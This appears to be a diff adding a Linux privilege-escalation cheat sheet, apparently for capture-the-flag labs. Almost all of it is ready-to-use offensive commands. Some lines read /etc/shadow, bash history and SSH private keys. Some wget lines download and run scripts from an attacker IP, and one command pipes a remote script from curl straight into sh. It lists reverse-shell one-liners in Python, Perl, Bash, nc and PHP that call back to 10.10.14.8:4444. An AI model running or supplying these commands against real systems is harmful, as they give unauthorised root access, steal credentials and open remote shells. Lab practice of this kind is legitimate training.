@@ -1,0 +1,103 @@
+🧠 Basic Enumeration:
+whoami                     # Current user
+id                         # User ID and groups
+hostname                   # Hostname
+uname -a                   # Kernel and OS details
+pwd                        # Present working directory
+uname -r
+
+
+📁 Find user.txt and root.txt:
+find / -name user.txt 2>/dev/null
+find / -name root.txt 2>/dev/null
+
+🔧 Sudo Enumeration:
+sudo -l                   # List commands allowed by sudo
+sudo -l -U <username>     # List sudo rules for a specific user
+
+📦 SUID Binaries (Priv Esc with GTFOBins):
+find / -perm -4000 -type f 2>/dev/null		# Common useful ones: /usr/bin/find, /usr/bin/env, /bin/bash, /usr/bin/python
+
+✍ Writable Files & Directories:
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+🧰 Capabilities:
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+📅 Cron Jobs:
+cat /etc/crontab
+ls -la /etc/cron*
+ls -la /var/spool/cron/crontabs
+
+📂 File & Service Enumeration:
+ls -la /etc/passwd
+ls -la /etc/shadow
+cat /etc/shadow       # Requires root
+cat /etc/passwd
+
+ps aux                # Running processes
+ps -ef | grep root    # Processes run by root
+
+🧠 Bash History:
+cat ~/.bash_history
+cat /root/.bash_history    # If accessible
+
+🧾 SSH & Private Keys:
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+
+python3 -m http.server 80
+python -m SimpleHTTPServer 80
+wget http://<your-ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+wget http://<your-ip>/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64
+wget http://<your-ip>/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh
+wget http://<your-ip>/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh && /tmp/LinEnum.sh
+wget http://<your-ip>/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l1
+
+wget 192.168.1.5/LinEnum.sh -O LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
+cd /tmp && wget 192.168.1.5/bashark.sh && chmod +x bashark.sh && source bashark.sh
+wget 192.168.1.5/linuxprivchecker.py -O /tmp/linuxprivchecker.py && python3 /tmp/linuxprivchecker.py
+wget 192.168.1.5/private-i.sh -O private-i.sh && chmod 777 private-i.sh && ./private-i.sh
+
+/tools/
+├── linpeas.sh
+├── LinEnum.sh
+├── linux-exploit-suggester.sh
+├── pspy64
+├── lse.sh
+├──
+
+Reverse Shell Online: https://www.revshells.com/
+
+ReverseShell:
+
+Python : python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.8",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash"])'
+
+Perl : perl -e 'use Socket;$i="10.10.14.8";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Bash : bash -i >& /dev/tcp/10.10.14.8/4444 0>&1
+
+Bash : bash -c "sh -i >& /dev/tcp/10.10.16.53/1234 0>&1"
+
+nc : nc 10.10.14.8 4444 -e /bin/bash
+
+nc : rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.8 4444 > /tmp/f
+
+Php : php -r '$sock=fsockopen("10.10.14.8",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+rlwrap nc -lvnp 4444
+
+From PDF:
+
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+
+
+
+
+
+
+
+;
